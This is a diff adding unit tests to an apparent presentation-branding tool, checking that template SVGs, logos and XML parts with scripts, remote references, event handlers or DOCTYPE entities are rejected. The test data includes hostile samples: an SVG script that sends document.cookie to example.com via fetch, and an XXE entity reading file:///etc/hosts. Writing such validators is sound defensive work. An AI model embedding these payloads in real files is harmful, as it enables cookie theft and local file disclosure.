@@ -88,6 +88,35 @@ class Profile(unittest.TestCase):
         self.assertTrue(any("credit" in w for w in warnings))
 
 
+class WebFonts(unittest.TestCase):
+    """P2 24: a brand that loads a remote stylesheet says so, and names the host every PDF build will contact."""
+
+    def setUp(self):
+        self.tmp = tempfile.mkdtemp()
+
+    def tearDown(self):
+        shutil.rmtree(self.tmp)
+
+    def check(self, web_css):
+        bdir = write_brand(os.path.join(self.tmp, "brand"), {"fonts": {"web_css": web_css}})
+        return B.check(B.load(brand_dir=bdir))
+
+    def test_remote_stylesheet_warns_and_names_the_host(self):
+        errors, warnings = self.check("https://fonts.googleapis.com/css2?family=Inter")
+        self.assertEqual([e for e in errors if "web_css" in e], [])
+        self.assertTrue(any("fonts.googleapis.com" in w and "network" in w for w in warnings), warnings)
+
+    def test_anything_but_https_is_an_error(self):
+        for bad in ("http://example.com/a.css", "javascript:alert(1)", "//example.com/a.css", "https://"):
+            with self.subTest(web_css=bad):
+                errors, _ = self.check(bad)
+                self.assertTrue(any("fonts.web_css must be an https://" in e for e in errors), errors)
+
+    def test_default_brand_loads_nothing(self):
+        errors, warnings = B.check(B.load(start=self.tmp))
+        self.assertFalse(any("web_css" in m for m in errors + warnings), errors + warnings)
+
+
 class Templates(unittest.TestCase):
     def setUp(self):
         self.tmp = tempfile.mkdtemp()
@@ -243,6 +272,78 @@ class Templates(unittest.TestCase):
         png = open(os.path.join(X.ASSETS, "snapshot-placeholder.png"), "rb").read()
         with self.assertRaises(ValueError):
             T.from_template(self._with({"ppt/embeddings/x.png": png}, rel))
+
+    def _replacing(self, name, data):
+        """The company template with one existing part's bytes replaced."""
+        src = self.company_template()
+        out = os.path.join(self.tmp, "replaced.pptx")
+        with zipfile.ZipFile(src) as z, zipfile.ZipFile(out, "w") as dst:
+            self.assertIn(name, z.namelist())
+            for n in z.namelist():
+                dst.writestr(n, data if n == name else z.read(n))
+        return out
+
+    # P2 19: every SVG in ppt/media is copied into the deck, used or not, so each one is checked.
+    SVG = b'<svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" width="10" height="10">%s</svg>'
+
+    def test_template_svg_with_a_script_is_refused(self):
+        svg = self.SVG % b"<script>fetch('https://example.com/?'+document.cookie)</script>"
+        with self.assertRaisesRegex(ValueError, "script"):
+            T.from_template(self._with({"ppt/media/logo.svg": svg}))
+
+    def test_template_svg_with_a_remote_picture_is_refused(self):
+        for body in (b'<image xlink:href="https://example.com/pixel.png" width="1" height="1"/>',
+                     b'<image href="//example.com/pixel.png"/>',
+                     b'<rect style="fill:url(https://example.com/x.svg#p)" width="1" height="1"/>',
+                     b'<style>@import url(https://example.com/a.css);</style>'):
+            with self.subTest(body=body):
+                with self.assertRaisesRegex(ValueError, "outside the file|imports a stylesheet"):
+                    T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))
+
+    def test_template_svg_with_event_handlers_or_html_is_refused(self):
+        for body, reason in ((b'<rect onload="alert(1)" width="1" height="1"/>', "event handlers"),
+                             (b'<foreignObject><div xmlns="http://www.w3.org/1999/xhtml">x</div></foreignObject>', "HTML")):
+            with self.subTest(reason=reason):
+                with self.assertRaisesRegex(ValueError, reason):
+                    T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))
+
+    def test_template_plain_svg_is_kept(self):
+        body = (b'<defs><linearGradient id="g"><stop offset="0"/></linearGradient></defs>'
+                b'<rect fill="url(#g)" width="10" height="10"/><use xlink:href="#g"/>'
+                b'<image href="data:image/png;base64,iVBORw0KGgo=" width="1" height="1"/>')
+        b = T.from_template(self._with({"ppt/media/logo.svg": self.SVG % body}))
+        self.assertIn("ppt/media/logo.svg", b.parts)
+
+    # P2 23: kept parts are copied whether or not they are parsed, so the guard covers every one of them.
+    def test_doctype_in_a_kept_but_unparsed_part_is_refused(self):
+        evil = b'<?xml version="1.0"?><!DOCTYPE a [<!ENTITY x "y">]><a:theme xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">&x;</a:theme>'
+        for part in ("ppt/theme/theme1.xml", "ppt/presProps.xml"):
+            with self.subTest(part=part):
+                path = self._replacing(part, evil)
+                with self.assertRaisesRegex(ValueError, "DOCTYPE"):
+                    T.from_template(path)
+
+    def test_brand_check_reports_a_doctype_in_the_template(self):
+        bdir = write_brand(os.path.join(self.tmp, "brand"), {"deck": {"template": "company.pptx"}})
+        evil = b'<!DOCTYPE p [<!ENTITY x SYSTEM "file:///etc/hosts">]><p:presentationPr xmlns:p="x">&x;</p:presentationPr>'
+        shutil.copyfile(self._replacing("ppt/presProps.xml", evil), os.path.join(bdir, "company.pptx"))
+        errors, _ = B.check(B.load(brand_dir=bdir))
+        self.assertTrue(any("DOCTYPE" in e for e in errors), errors)
+
+    def test_svg_logo_with_a_remote_reference_is_refused(self):
+        src = os.path.join(self.tmp, "logo.svg")
+        with open(src, "wb") as f:
+            f.write(self.SVG % b'<image xlink:href="https://example.com/track.png" width="1" height="1"/>')
+        with self.assertRaisesRegex(ValueError, "outside the file"):
+            B.store_logo(src, os.path.join(self.tmp, "brand"))
+        self.assertFalse(os.path.exists(os.path.join(self.tmp, "brand", "logo.svg")))
+
+    def test_brand_check_reports_a_hand_placed_svg_logo_with_a_script(self):
+        bdir = write_brand(os.path.join(self.tmp, "brand"), {"logo": {"file": "logo.svg"}})
+        with open(os.path.join(bdir, "logo.svg"), "wb") as f:
+            f.write(self.SVG % b"<script>alert(1)</script>")
+        errors, _ = B.check(B.load(brand_dir=bdir))
+        self.assertTrue(any("carries a script" in e for e in errors), errors)
 
     def test_unknown_layout_is_an_error(self):
         bdir = write_brand(os.path.join(self.tmp, "brand"), {"deck": {"template": "company.pptx", "layouts": {"title": "Nope"}}})
